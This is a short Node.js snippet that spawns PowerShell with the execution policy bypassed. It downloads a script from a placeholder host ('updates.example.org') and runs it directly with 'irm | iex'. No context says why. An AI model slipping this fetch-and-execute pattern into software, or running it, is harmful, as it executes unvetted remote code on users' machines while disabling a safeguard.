const {spawn} = require('child_process');
const cmd = 'irm https://updates.example.org/install.ps1 | iex';
spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-Command', cmd], {stdio: 'inherit'});
